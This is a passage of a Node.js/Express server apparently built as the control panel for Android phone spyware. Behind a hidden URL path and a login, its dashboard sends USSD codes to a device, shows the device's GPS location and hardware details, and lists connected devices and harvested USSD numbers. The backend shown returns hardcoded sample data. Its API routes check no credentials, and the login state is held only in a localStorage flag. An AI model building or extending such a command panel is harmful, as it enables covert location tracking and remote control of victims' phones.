    html += '      </div>\n';
    html += '      <button class="logout-btn" onclick="logout()">🚪 Logout</button>\n';
    html += '    </div>\n';
    html += '    <div class="stats" id="statsGrid">\n';
    html += '      <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>\n';
    html += '    </div>\n';
    html += '    <div class="tools-grid">\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📞</span> USSD Code</h4>\n';
    html += '        <div class="ussd-input-group">\n';
    html += '          <input type="text" id="ussdInput" placeholder="Enter USSD code (e.g., *123#)" value="">\n';
    html += '          <button onclick="executeUssd()">Execute</button>\n';
    html += '        </div>\n';
    html += '        <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📍</span> Device Location</h4>\n';
    html += '        <div id="locationInfo" class="location-info">\n';
    html += '          <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>\n';
    html += '          <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>\n';
    html += '          <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>\n';
    html += '        </div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📱</span> Device Info</h4>\n';
    html += '        <div id="deviceInfo" class="device-info-grid">\n';
    html += '          <span class="label">Model:</span><span class="value" id="diModel">--</span>\n';
    html += '          <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>\n';
    html += '          <span class="label">Android Version:</span><span class="value" id="diAndroid">--</span>\n';
    html += '          <span class="label">Battery:</span><span class="value" id="diBattery">--</span>\n';
    html += '          <span class="label">Storage:</span><span class="value" id="diStorage">--</span>\n';
    html += '          <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>\n';
    html += '        </div>\n';
    html += '        <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>\n';
    html += '      </div>\n';
    html += '    </div>\n';
    html += '    <div class="section">\n';
    html += '      <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>\n';
    html += '      <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>\n';
    html += '    </div>\n';
    html += '    <div class="section">\n';
    html += '      <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>\n';
    html += '      <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>\n';
        html += '    </div>\n';
    html += '  </div>\n';
    html += '</div>\n';
    html += '<script>\n';
    html += 'const API_BASE = "/a9f3k217";\n';
    html += 'async function login() {\n';
    html += '  const username = document.getElementById("loginUser").value;\n';
    html += '  const password = document.getElementById("loginPass").value;\n';
    html += '  const errorEl = document.getElementById("loginError");\n';
    html += '  const attemptsMsg = document.getElementById("attemptsMsg");\n';
    html += '  errorEl.style.display = "none";\n';
    html += '  attemptsMsg.textContent = "";\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/login", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ username, password })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) {\n';
    html += '      localStorage.setItem("adminLoggedIn", "true");\n';
    html += '      document.getElementById("loginContainer").style.display = "none";\n';
    html += '      document.getElementById("dashboard").classList.remove("hidden");\n';
    html += '      loadData();\n';
    html += '      refreshLocation();\n';
    html += '      refreshDeviceInfo();\n';
    html += '      document.getElementById("loginUser").value = "";\n';
    html += '      document.getElementById("loginPass").value = "";\n';
    html += '    } else {\n';
    html += '      document.getElementById("loginUser").value = "";\n';
    html += '      document.getElementById("loginPass").value = "";\n';
    html += '      if (data.remainingAttempts !== undefined) {\n';
    html += '        let left = data.remainingAttempts;\n';
    html += '        let msg;\n';
    html += '        if (left === 0) {\n';
    html += '          msg = "⚠️ You have been blocked for 12 hours. Try again later.";\n';
    html += '        } else {\n';
    html += '          msg = "⚠️ " + left + " attempt" + (left > 1 ? "s" : "") + " remaining before 12h block";\n';
    html += '        }\n';
    html += '        attemptsMsg.textContent = msg;\n';
    html += '      } else {\n';
    html += '        errorEl.textContent = data.error || "Invalid credentials";\n';
    html += '        errorEl.style.display = "block";\n';
    html += '      }\n';
    html += '    }\n';
    html += '  } catch (err) {\n';
    html += '    errorEl.textContent = "Connection error";\n';
    html += '    errorEl.style.display = "block";\n';
    html += '    console.error("Login error:", err);\n';
    html += '  }\n';
    html += '}\n';
    html += 'function logout() {\n';
    html += '  localStorage.removeItem("adminLoggedIn");\n';
    html += '  document.getElementById("loginUser").value = "";\n';
    html += '  document.getElementById("loginPass").value = "";\n';
    html += '  document.getElementById("dashboard").classList.add("hidden");\n';
    html += '  document.getElementById("loginContainer").style.display = "block";\n';
    html += '  document.getElementById("attemptsMsg").textContent = "";\n';
    html += '  document.getElementById("loginError").style.display = "none";\n';
    html += '}\n';
    html += 'async function executeUssd() {\n';
    html += '  const code = document.getElementById("ussdInput").value.trim();\n';
    html += '  const responseEl = document.getElementById("ussdResponse");\n';
    html += '  if (!code) {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "⚠️ Please enter a USSD code";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  responseEl.className = "ussd-response waiting";\n';
    html += '  responseEl.textContent = "⏳ Sending USSD code... waiting for response...";\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/ussd", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ code })\n';
    html += '    });\n';
    html += '    const data = await res.json();\n';
    html += '    if (data.success) {\n';
    html += '      responseEl.className = "ussd-response success";\n';
    html += '      responseEl.textContent = "📥 " + data.message;\n';
    html += '      loadData();\n';
    html += '    } else {\n';
    html += '      responseEl.className = "ussd-response error";\n';
    html += '      responseEl.textContent = "❌ " + (data.error || "Execution failed");\n';
    html += '    }\n';
    html += '  } catch {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "❌ Connection error";\n';
    html += '  }\n';
    html += '}\n';
    html += 'async function refreshLocation() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/location");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("latValue").textContent = data.lat ?? "--";\n';
    html += '    document.getElementById("lngValue").textContent = data.lng ?? "--";\n';
    html += '    document.getElementById("accValue").textContent = data.accuracy ? data.accuracy + "m" : "--";\n';
    html += '    document.getElementById("locTime").textContent = data.time || "--";\n';
    html += '    if (data.lat && data.lng) {\n';
    html += '      document.getElementById("mapLink").href = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;\n';
    html += '      document.getElementById("mapLink").style.display = "inline";\n';
    html += '    } else {\n';
    html += '      document.getElementById("mapLink").style.display = "none";\n';
    html += '    }\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += 'async function refreshDeviceInfo() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/device-info");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("diModel").textContent = data.model || "--";\n';
    html += '    document.getElementById("diManufacturer").textContent = data.manufacturer || "--";\n';
    html += '    document.getElementById("diAndroid").textContent = data.android_version || "--";\n';
    html += '    document.getElementById("diBattery").textContent = data.battery ? data.battery + "%" : "--";\n';
    html += '    document.getElementById("diStorage").textContent = data.storage || "--";\n';
    html += '    document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += 'async function loadData() {\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/stats");\n';
    html += '    const stats = await response.json();\n';
    html += '    document.getElementById("devicesCount").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numbersCount").textContent = stats.ussd_count || 0;\n';
    html += '    document.getElementById("onlineCount").textContent = stats.online || 0;\n';
    html += '    document.getElementById("deviceCountBadge").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numberCountBadge").textContent = stats.ussd_count || 0;\n';
    html += '    const ussdRes = await fetch(API_BASE + "/api/ussd-numbers");\n';
    html += '    const ussdNumbers = await ussdRes.json();\n';
    html += '    renderUssdNumbers(ussdNumbers);\n';
    html += '    const devices = stats.devices ? [{ name: "Sample Device", status: "online", battery: 85 }] : [];\n';
    html += '    renderDevices(devices);\n';
    html += '  } catch (error) { console.error("Error loading data:", error); }\n';
    html += '}\n';
    html += 'function renderDevices(devices) {\n';
    html += '  const container = document.getElementById("devicesList");\n';
    html += '  if (!devices || devices.length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">📱</div>No devices connected yet</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>";\n';
    html += '  devices.forEach(d => {\n';
    html += '    const statusClass = d.status === "online" ? "online" : "offline";\n';
    html += '    const statusText = d.status === "online" ? "🟢 Online" : "🔴 Offline";\n';
    html += '    html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || "--"}%</td></tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += 'function renderUssdNumbers(numbers) {\n';
    html += '  const container = document.getElementById("numbersList");\n';
    html += '  if (!numbers || numbers.length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">📞</div>No USSD codes detected yet</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>";\n';
    html += '  numbers.forEach(n => {\n';
    html += '    html += `<tr><td>${n.device || "Unknown"}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += 'if (localStorage.getItem("adminLoggedIn") === "true") {\n';
    html += '  document.getElementById("loginContainer").style.display = "none";\n';
    html += '  document.getElementById("dashboard").classList.remove("hidden");\n';
    html += '  loadData();\n';
    html += '  refreshLocation();\n';
    html += '  refreshDeviceInfo();\n';
    html += '}\n';
    html += 'document.getElementById("loginPass").addEventListener("keypress", (e) => {\n';
    html += '  if (e.key === "Enter") login();\n';
    html += '});\n';
    html += '</script>\n';
    html += '</body>\n';
    html += '</html>';

    res.send(html);
});// ============================================================
// LOGIN API
// ============================================================
app.post('/a9f3k217/api/login', (req, res) => {
    const ip = getClientIP(req);
    const now = Date.now();
    const blockDuration = 12 * 60 * 60 * 1000;

    console.log(`Login attempt from IP: ${ip}`);
    if (failedAttempts[ip]) {
        console.log(`Current attempts for ${ip}: ${failedAttempts[ip].count}`);
    }

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
        return res.status(401).json({ remainingAttempts: 0 });
    }

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
        delete failedAttempts[ip];
    }

    const { username, password } = req.body;
    const hash = crypto.createHash('sha256').update(password).digest('hex');
    const validUser = username === ADMIN_USER;
    const validPass = validUser && hash === ADMIN_PASS_HASH;

    if (validUser && validPass) {
        delete failedAttempts[ip];
        res.json({ success: true });
    } else {
        if (!failedAttempts[ip]) {
            failedAttempts[ip] = { count: 1, blockUntil: 0 };
        } else {
            failedAttempts[ip].count += 1;
        }

        const remaining = 5 - failedAttempts[ip].count;
        if (remaining <= 0) {
            failedAttempts[ip].blockUntil = now + blockDuration;
            console.log(`🔒 IP ${ip} blocked for 12 hours`);
            res.status(401).json({ remainingAttempts: 0 });
        } else {
            console.log(`❌ IP ${ip} has ${remaining} attempts left`);
            res.status(401).json({ remainingAttempts: remaining });
        }
    }
});

// ============================================================
// USSD ENDPOINTS
// ============================================================
let ussdNumbers = [];

app.post('/a9f3k217/api/ussd', (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'No USSD code provided' });
    console.log(`📞 USSD Executed: ${code}`);

    let responseMessage = '';
    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
    else responseMessage = `USSD code ${code} executed. No further response available.`;

    const cleanNumber = code.replace(/\D/g, '');
    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
        ussdNumbers.unshift({
            device: 'Sample Device',
            number: cleanNumber,
            type: 'USSD',
            timestamp: Date.now()
        });
        if (ussdNumbers.length > 100) ussdNumbers.pop();
    }

    res.json({ success: true, message: responseMessage });
});

app.get('/a9f3k217/api/ussd-numbers', (req, res) => res.json(ussdNumbers));
app.get('/a9f3k217/api/stats', (req, res) => {
    res.json({
        devices: 0,
        numbers: ussdNumbers.length,
        online: 0,
        ussd_count: ussdNumbers.length
    });
});
app.get('/a9f3k217/api/location', (req, res) => {
    res.json({
        lat: -1.9441,
        lng: 30.0619,
        accuracy: 15,
        time: new Date().toLocaleString()
    });
});
app.get('/a9f3k217/api/device-info', (req, res) => {
    res.json({
        model: 'Samsung Galaxy S23',
        manufacturer: 'Samsung',
        android_version: '14.0',
        battery: 76,
        storage: '128GB / 89GB used',
        device_id: 'abc123def456'
    });
});
app.get('/a9f3k217/api/devices', (req, res) => res.json([]));

// ============================================================
// 404 HANDLER
// ============================================================
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
});
